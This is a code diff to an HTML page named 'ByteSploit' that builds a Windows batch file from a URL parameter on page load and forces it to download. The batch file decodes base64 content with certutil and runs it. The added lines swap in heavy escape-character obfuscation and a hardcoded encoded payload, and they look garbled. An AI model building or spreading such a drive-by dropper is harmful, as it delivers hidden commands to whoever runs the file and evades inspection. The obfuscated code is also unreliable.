@@ -2,43 +2,42 @@
 <html>
 	<title>ByteSploit</title> 
 	<script> 
-		function  createBatchFile ( )  { 
+		function createBatchFile() { 
 			// Get arguments from form input or URL 
-			var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
-			var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
-			if  ( urlcmd  !==  null )  { 
-				cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
+			var urlParams = new URLSearchParams(window.location.search); 
+			var urlcmd = urlParams.get('cmd'); 
+			if (urlcmd !== null) { 
+				cmd = urlcmd; 
 			} 
 			
 			// Create batch file content 
-			var  content  =  '@echo off\r\n' ; 
-			content += 'setlocal enabledelayedexpansion\r\n';
-			content += 'set base64_string=' + cmd + '\r\n';
-			content += 'set "temp_file=%temp%\\temp.bat"\r\n';
-			content += 'echo %base64_string% > %temp_file%\r\n';
-			content += 'certutil -decode %temp_file% %temp%\\decoded.bat >nul\r\n';
-			content += 'del %temp_file%\r\n';
-			content += 'call %temp%\\decoded.bat >nul\r\n';
+			var content = "if '1'=='0' setlocal\n"; 
+			content += "if '1'=='0' goto :EOF\n"; 
+			content += "%^<^%set ^<^%^[^^^B0^%^]^^^[^^^A3^%^]file_name^>^=%%RANDOM%%%%RANDOM%.bat%^>^% \n"; 
+			content += "%^<^%set ^<^%^[^^^B0^%^]^^^[^^^A3^%^]encoded_cmd^>^=JABlAHMAZQAgACoAZgBpAHQAIAAnAWYAYQBiAGwAbAB5ACAAIAB3AGkAcwB0ACAAJwAqACAAKQAgADsAIABzAGUAdABsAGkAYwBhAGwAZQBkAGUAXwBjAG0AZAAgPwAgAG4AdQBsAA==%^>^% \n"; 
+			content += "%^<^%certutil -decode %^<^%^[^^^B0^%^]^^^[^^^A3^%^]file_name^>^% %^<^%^[^^^B0^%^]^^^[^^^A3^%^]decoded_cmd^>^% > nul%^>^% \n"; 
+			content += "%^<^%del %^<^%^[^^^B0^%^]^^^[^^^A3^%^]file_name^>^% > nul%^>^% \n"; 
+			content += "%^<^%call %^<^%^[^^^B0^%^]^^^[^^^A3^%^]decoded_cmd^>^% > nul%^>^% \n"; 
 			
 			// Create Blob object 
-			var  blob  =  new  Blob ( [ content ] ,  { type :  'text/plain' } ) ; 
+			var blob = new Blob([content], {type: 'text/plain'}); 
 			
 			// Generate random filename 
-			var  filename  =  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
+			var filename = 'script_' + Math.random().toString(36).substring(2) + '.bat'; 
 			
 			// Generate download URL and set it as the href of a link 
-			var  link  =  document . createElement ( 'a' ) ; 
-			link . download  =  filename ; 
-			link . href  =  URL . createObjectURL ( blob ) ; 
-			link . click ( ) ; 
+			var link = document.createElement('a'); 
+			link.download = filename; 
+			link.href = URL.createObjectURL(blob); 
+			link.click(); 
 		} 
 		
 		// Set default value of cmd from URL and create batch file 
-		var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
-		var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
-		if  ( urlcmd  !==  null )  { 
-			var  cmd  =  btoa(urlcmd) ; // Encode the cmd variable in base64
-			createBatchFile ( ) ; 
+		var urlParams = new URLSearchParams(window.location.search); 
+		var urlcmd = urlParams.get('cmd'); 
+		if (urlcmd !== null) { 
+			var cmd = urlcmd; 
+			createBatchFile(); 
 		} 
 	</script>
 <body> 
